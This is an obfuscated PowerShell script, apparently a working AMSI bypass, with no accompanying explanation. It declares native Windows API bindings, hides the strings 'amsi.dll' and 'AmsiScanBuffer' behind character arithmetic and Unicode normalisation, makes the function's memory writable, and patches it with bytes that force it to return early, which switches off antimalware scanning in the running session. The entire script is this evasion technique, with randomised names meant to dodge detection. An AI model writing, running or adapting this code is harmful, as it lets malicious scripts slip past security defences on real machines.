$Ahc = @"
using System;
using System.Runtime.InteropServices;
public class Ahc {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr QHz_4_xARg09, string Ug8NjpEZ4Qyq9vdbk);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr SXr6VB0iOwwV_KnI, UIntPtr ORJlnvYvrEoaus1p8Y4u, uint eKDQ2cHhAhjVZxbPIZlZ, out uint MRbGIR);
}
"@

Add-Type $Ahc

$JerGD0eKxSCIrG__ = [Ahc]::LoadLibrary("$(('ámsí.'+'dll').nOrMALIZE([ChaR]([byTe]0x46)+[CHar]([ByTe]0x6f)+[cHar]([bYTe]0x72)+[CHAr]([bYtE]0x6d)+[ChaR](45+23)) -replace [cHaR](92*80/80)+[ChAr](112*7/7)+[CHAr](123)+[cHaR](77)+[Char]([bytE]0x6e)+[ChAR](125+111-111))")
$NcnB1lJJT_3W = [Ahc]::GetProcAddress($JerGD0eKxSCIrG__, "$(('ÃmsîScánBûff'+'êr').normalizE([ChAR]([bytE]0x46)+[chAr]([ByTE]0x6f)+[CHAr]([byTE]0x72)+[CHaR](107+2)+[ChAr](57+11)) -replace [chaR]([byTe]0x5c)+[Char]([BytE]0x70)+[Char](123+115-115)+[chAR](37+40)+[CHaR](110)+[ChAr](125+17-17))")
$p = 0
[Ahc]::VirtualProtect($NcnB1lJJT_3W, [uint32]5, 0x40, [ref]$p)
$wwQmwy = "0xB8"
$yvfCBxvOZ6oJTsUkr = "0x57"
$AsDHogVGX = "0x00"
$IBzXvfwRinkcVsS = "0x07"
$SRC3Mmi7kLSq44 = "0x80"
$fHH_ = "0xC3"
$hgI_Y5UR5pdeKLq9l = [Byte[]] ($wwQmwy,$yvfCBxvOZ6oJTsUkr,$AsDHogVGX,$IBzXvfwRinkcVsS,+$SRC3Mmi7kLSq44,+$fHH_)
[System.Runtime.InteropServices.Marshal]::Copy($hgI_Y5UR5pdeKLq9l, 0, $NcnB1lJJT_3W, 6)